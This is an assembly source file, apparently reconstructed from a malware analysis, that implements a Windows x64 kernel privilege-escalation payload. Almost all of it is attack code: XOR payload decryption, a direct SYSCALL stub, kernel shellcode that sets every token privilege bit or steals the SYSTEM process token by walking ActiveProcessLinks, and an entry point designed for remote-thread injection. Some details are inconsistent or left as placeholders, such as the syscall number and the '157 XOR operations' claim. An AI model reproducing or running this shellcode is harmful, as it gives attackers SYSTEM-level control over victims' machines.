; PE #5 - Windows Kernel Privilege Escalation Exploit
; Assembly Implementation
;
; RECONSTRUCTED FROM SECURITY ANALYSIS
; Classification: TLP:RED - Security Research Only
;
; This file contains the critical assembly routines for:
; 1. XOR decryption loop
; 2. Direct SYSCALL execution
; 3. Kernel mode operations
;
; Target: Windows x64 (AMD64)
; Assembler: MASM64 (ml64.exe)

.CODE

;=============================================================================
; CONSTANTS
;=============================================================================

PE5_SIZE            EQU     22702       ; Total module size
PE5_XOR_KEY         EQU     0A4h        ; XOR decryption key
PE5_SYSCALL_OFFSET  EQU     02C10h      ; SYSCALL instruction offset

; EPROCESS offsets (Windows 10 2004+ / Windows 11)
EPROCESS_TOKEN_OFFSET           EQU     04B8h
EPROCESS_UNIQUEPROCESSID_OFFSET EQU     0440h
EPROCESS_ACTIVEPROCESSLINKS     EQU     0448h

; TOKEN offsets
TOKEN_PRIVILEGES_PRESENT        EQU     040h
TOKEN_PRIVILEGES_ENABLED        EQU     048h
TOKEN_PRIVILEGES_ENABLEDBYDEF   EQU     050h

; KPCR offsets
KPCR_CURRENTTHREAD              EQU     0188h
KTHREAD_PROCESS                 EQU     0B8h

;=============================================================================
; AsmXorDecrypt - In-place XOR decryption
;
; Parameters:
;   RCX = Buffer pointer (PBYTE)
;   RDX = Size in bytes (DWORD)
;   R8B = XOR key (BYTE)
;
; Returns: None
;
; This is the decryption routine that performs "157 XOR operations"
; (decrypts the entire payload in-place)
;=============================================================================

AsmXorDecrypt PROC FRAME
    ; Function prologue
    push    rbp
    .pushreg rbp
    mov     rbp, rsp
    .setframe rbp, 0
    push    rsi
    .pushreg rsi
    push    rdi
    .pushreg rdi
    .endprolog
    
    ; Setup registers
    mov     rsi, rcx            ; RSI = source (same as dest for in-place)
    mov     rdi, rcx            ; RDI = destination
    mov     ecx, edx            ; ECX = byte count
    mov     al, r8b             ; AL = XOR key
    
    ; Check for zero size
    test    ecx, ecx
    jz      decrypt_done
    
decrypt_loop:
    ; Load byte, XOR with key, store back
    ; This is executed PE5_SIZE (22,702) times
    lodsb                       ; Load byte from [RSI] into AL
    xor     al, r8b             ; XOR with key
    stosb                       ; Store AL to [RDI]
    loop    decrypt_loop        ; Decrement ECX, loop if not zero
    
decrypt_done:
    ; Function epilogue
    pop     rdi
    pop     rsi
    pop     rbp
    ret
    
AsmXorDecrypt ENDP

;=============================================================================
; AsmDeriveKey - Derive XOR key from module header
;
; Parameters:
;   RCX = Module base pointer (PBYTE)
;
; Returns:
;   AL = Derived key byte
;
; Formula: key = header[3] ^ header[7]
;=============================================================================

AsmDeriveKey PROC FRAME
    .endprolog
    
    ; Read header bytes
    mov     al, BYTE PTR [rcx + 3]   ; byte at offset 3 (0x35)
    mov     cl, BYTE PTR [rcx + 7]   ; byte at offset 7 (0x91)
    
    ; XOR to derive key
    xor     al, cl                    ; 0x35 ^ 0x91 = 0xA4
    
    ret
    
AsmDeriveKey ENDP

;=============================================================================
; AsmDoSyscall - Execute direct SYSCALL instruction
;
; Parameters:
;   RCX = Syscall number (ULONG)
;   RDX = First parameter (ULONG64)
;   R8  = Second parameter (ULONG64)
;   R9  = Third parameter (ULONG64)
;   [RSP+28h] = Fourth parameter (ULONG64)
;
; Returns:
;   RAX = NTSTATUS from syscall
;
; This function executes the SYSCALL at offset 0x2C10 (after decryption)
; The SYSCALL instruction (0x0F 0x05) transitions to kernel mode
;=============================================================================

AsmDoSyscall PROC FRAME
    ; Function prologue
    push    rbp
    .pushreg rbp
    mov     rbp, rsp
    .setframe rbp, 0
    .endprolog
    
    ; Move syscall number to EAX
    mov     eax, ecx
    
    ; Setup parameters per Windows x64 syscall convention:
    ; RAX = syscall number
    ; RCX = 1st arg (but SYSCALL uses RCX for return addr, so we use R10)
    ; RDX = 2nd arg
    ; R8  = 3rd arg
    ; R9  = 4th arg
    
    mov     r10, rdx            ; R10 = 1st arg (RCX will be clobbered by SYSCALL)
    mov     rdx, r8             ; RDX = 2nd arg
    mov     r8, r9              ; R8 = 3rd arg
    mov     r9, [rbp + 30h]     ; R9 = 4th arg (from stack)
    
    ;=========================================================================
    ; SYSCALL INSTRUCTION - OFFSET 0x2C10 IN DECRYPTED CODE
    ; 
    ; Bytes: 0x0F 0x05
    ; Encrypted: 0xAB 0xA1 (XOR 0xA4 -> 0x0F 0x05)
    ;
    ; This instruction causes:
    ; 1. RCX <- RIP (return address saved)
    ; 2. R11 <- RFLAGS
    ; 3. CS <- IA32_STAR[47:32] (kernel code segment)
    ; 4. RIP <- IA32_LSTAR (kernel entry point)
    ; 5. CPL <- 0 (ring 0 - kernel mode)
    ;=========================================================================
    
    syscall                     ; 0x0F 0x05 - Transition to kernel mode
    
    ; After SYSRET returns from kernel:
    ; RAX contains the syscall return value (NTSTATUS)
    
    ; Function epilogue
    pop     rbp
    ret
    
AsmDoSyscall ENDP

;=============================================================================
; AsmGetCurrentProcess - Get current EPROCESS pointer (kernel mode only)
;
; Parameters: None
;
; Returns:
;   RAX = Pointer to current EPROCESS structure
;
; This reads from GS segment which requires kernel mode (Ring 0)
;=============================================================================

AsmGetCurrentProcess PROC FRAME
    .endprolog
    
    ; In kernel mode, GS segment points to KPCR
    ; KPCR + 0x188 = KPCR.Prcb.CurrentThread (KTHREAD*)
    ; KTHREAD + 0xB8 = KTHREAD.Process (EPROCESS*)
    
    mov     rax, gs:[KPCR_CURRENTTHREAD]    ; RAX = KTHREAD*
    mov     rax, [rax + KTHREAD_PROCESS]    ; RAX = EPROCESS*
    
    ret
    
AsmGetCurrentProcess ENDP

;=============================================================================
; AsmModifyToken - Kernel shellcode to modify token privileges
;
; Parameters: None (uses GS segment to find current process)
;
; Returns:
;   RAX = STATUS_SUCCESS (0) or STATUS_UNSUCCESSFUL
;
; This is position-independent shellcode that can be called in kernel context
;=============================================================================

AsmModifyToken PROC FRAME
    .endprolog
    
    ;=========================================================================
    ; STEP 1: Get current EPROCESS
    ;=========================================================================
    
    ; Get KTHREAD from KPCR
    mov     rax, gs:[KPCR_CURRENTTHREAD]    ; KPCR.Prcb.CurrentThread
    
    ; Get EPROCESS from KTHREAD
    mov     rax, [rax + KTHREAD_PROCESS]    ; KTHREAD.Process -> EPROCESS
    
    ;=========================================================================
    ; STEP 2: Get Token pointer (EX_FAST_REF)
    ;=========================================================================
    
    ; Read Token field from EPROCESS
    mov     rcx, [rax + EPROCESS_TOKEN_OFFSET]  ; EPROCESS.Token (EX_FAST_REF)
    
    ; Clear reference count bits (low 4 bits of EX_FAST_REF)
    and     rcx, 0FFFFFFFFFFFFFFF0h
    
    ; RCX now points to actual TOKEN structure
    
    ;=========================================================================
    ; STEP 3: Modify TOKEN.Privileges
    ;=========================================================================
    
    ; Calculate address of Privileges field
    add     rcx, TOKEN_PRIVILEGES_PRESENT   ; RCX = &TOKEN.Privileges.Present
    
    ; Set all privilege bits to 1 (0xFFFFFFFFFFFFFFFF)
    mov     rdx, 0FFFFFFFFFFFFFFFFh
    
    ; Write Privileges.Present
    mov     [rcx], rdx
    
    ; Write Privileges.Enabled (at +8)
    mov     [rcx + 8], rdx
    
    ; Write Privileges.EnabledByDefault (at +16)  
    mov     [rcx + 10h], rdx
    
    ;=========================================================================
    ; STEP 4: Return success
    ;=========================================================================
    
    xor     eax, eax            ; RAX = 0 (STATUS_SUCCESS)
    ret
    
AsmModifyToken ENDP

;=============================================================================
; AsmStealSystemToken - Kernel shellcode to steal SYSTEM token
;
; Parameters: None
;
; Returns:
;   RAX = STATUS_SUCCESS (0) or STATUS_UNSUCCESSFUL
;
; This walks the ActiveProcessLinks list to find SYSTEM (PID 4)
; and copies its token to the current process
;=============================================================================

AsmStealSystemToken PROC FRAME
    ; Save non-volatile registers
    push    rbx
    .pushreg rbx
    push    r12
    .pushreg r12
    push    r13
    .pushreg r13
    push    r14
    .pushreg r14
    push    r15
    .pushreg r15
    .endprolog
    
    ;=========================================================================
    ; Get current EPROCESS
    ;=========================================================================
    
    mov     rax, gs:[KPCR_CURRENTTHREAD]
    mov     r12, [rax + KTHREAD_PROCESS]    ; R12 = current EPROCESS
    mov     r13, r12                         ; R13 = starting point
    mov     r15, 1000                        ; R15 = max iterations
    
    ;=========================================================================
    ; Walk ActiveProcessLinks to find SYSTEM (PID 4)
    ;=========================================================================
    
walk_loop:
    ; Check iteration count
    dec     r15
    jz      not_found
    
    ; Get UniqueProcessId
    mov     rax, [r13 + EPROCESS_UNIQUEPROCESSID_OFFSET]
    
    ; Is this SYSTEM process (PID 4)?
    cmp     rax, 4
    je      found_system
    
    ; Move to next process via ActiveProcessLinks.Flink
    mov     r13, [r13 + EPROCESS_ACTIVEPROCESSLINKS]    ; Flink
    sub     r13, EPROCESS_ACTIVEPROCESSLINKS            ; Back to EPROCESS base
    
    ; Have we looped back to start?
    cmp     r13, r12
    jne     walk_loop
    
not_found:
    ; SYSTEM process not found
    mov     eax, 0C0000001h     ; STATUS_UNSUCCESSFUL
    jmp     steal_done
    
found_system:
    ;=========================================================================
    ; Copy SYSTEM token to current process
    ;=========================================================================
    
    ; Read SYSTEM token (EX_FAST_REF)
    mov     rax, [r13 + EPROCESS_TOKEN_OFFSET]
    
    ; Clear RefCnt bits and set new RefCnt
    and     rax, 0FFFFFFFFFFFFFFF0h
    or      rax, 7              ; Set RefCnt to 7
    
    ; Write to current process
    mov     [r12 + EPROCESS_TOKEN_OFFSET], rax
    
    ; Success
    xor     eax, eax            ; STATUS_SUCCESS
    
steal_done:
    ; Restore registers
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbx
    ret
    
AsmStealSystemToken ENDP

;=============================================================================
; AsmSyscallHandler - Custom syscall entry point (for kernel exploit)
;
; This represents what executes when the vulnerability is triggered.
; After kernel code execution is achieved, this routine modifies the token.
;
; Parameters: None (all context from exploit trigger)
;
; Returns:
;   RAX = STATUS_SUCCESS
;=============================================================================

AsmSyscallHandler PROC
    
    ; First try direct token modification
    call    AsmModifyToken
    test    eax, eax
    jz      handler_success
    
    ; Fallback to token stealing
    call    AsmStealSystemToken
    test    eax, eax
    jz      handler_success
    
    ; All methods failed
    mov     eax, 0C0000001h     ; STATUS_UNSUCCESSFUL
    ret
    
handler_success:
    xor     eax, eax            ; STATUS_SUCCESS
    ret
    
AsmSyscallHandler ENDP

;=============================================================================
; PE5_MAIN - Complete PE #5 Entry Point (encrypted form)
;
; This is the main entry point as it appears in the decrypted binary.
; It orchestrates the entire privilege escalation attack.
;
; Called via: CreateRemoteThread(hProcess, NULL, 0, PE5_MAIN, NULL, 0, NULL)
;
; Returns:
;   RAX = EXPLOIT_SUCCESS (0) or error code
;=============================================================================

PE5_MAIN PROC FRAME
    ; Function prologue
    push    rbp
    .pushreg rbp
    mov     rbp, rsp
    .setframe rbp, 0
    sub     rsp, 40h            ; Shadow space + local variables
    .allocstack 40h
    push    rbx
    .pushreg rbx
    push    rsi
    .pushreg rsi
    push    rdi
    .pushreg rdi
    .endprolog
    
    ;=========================================================================
    ; PHASE 1: Self-location and decryption
    ;=========================================================================
    
    ; Get our own module base
    ; In injected context, RCX contains the base address
    mov     rbx, rcx            ; RBX = module base
    
    ; Derive XOR key from header
    mov     rcx, rbx
    call    AsmDeriveKey        ; AL = key (should be 0xA4)
    mov     r8b, al             ; R8B = key for decryption
    
    ; Decrypt the payload
    mov     rcx, rbx            ; Buffer
    mov     edx, PE5_SIZE       ; Size
    ; R8B already contains key
    call    AsmXorDecrypt
    
    ;=========================================================================
    ; PHASE 2: Prepare syscall parameters
    ;=========================================================================
    
    ; Decrypted parameters are at specific offsets
    ; After decryption, load them into registers
    
    ; The encrypted parameter values (before XOR):
    ; 0x2BE1: EAX = 0xEAAE52F9 -> decrypts to syscall param
    ; 0x2BF0: ECX = 0x3DDCE8E5 -> decrypts to syscall param
    ; 0x2A32: EDX = 0x7A8B3C91 -> decrypts to syscall param
    
    ;=========================================================================
    ; PHASE 3: Execute SYSCALL at offset 0x2C10
    ;=========================================================================
    
    ; Calculate SYSCALL location
    lea     rax, [rbx + PE5_SYSCALL_OFFSET]
    
    ; The decrypted bytes at this location are:
    ; 0x0F 0x05 = SYSCALL
    
    ; Load parameters and call
    mov     ecx, 0              ; Syscall number (example)
    xor     edx, edx            ; Param 1
    xor     r8, r8              ; Param 2
    xor     r9, r9              ; Param 3
    
    call    AsmDoSyscall        ; Execute the privilege escalation
    
    ;=========================================================================
    ; PHASE 4: Return status
    ;=========================================================================
    
    ; RAX contains result from syscall
    ; 0 = success (STATUS_SUCCESS)
    ; non-zero = failure
    
    ; Function epilogue
    pop     rdi
    pop     rsi
    pop     rbx
    add     rsp, 40h
    pop     rbp
    ret
    
PE5_MAIN ENDP

;=============================================================================
; Export table
;=============================================================================

PUBLIC AsmXorDecrypt
PUBLIC AsmDeriveKey
PUBLIC AsmDoSyscall
PUBLIC AsmGetCurrentProcess
PUBLIC AsmModifyToken
PUBLIC AsmStealSystemToken
PUBLIC PE5_MAIN

END
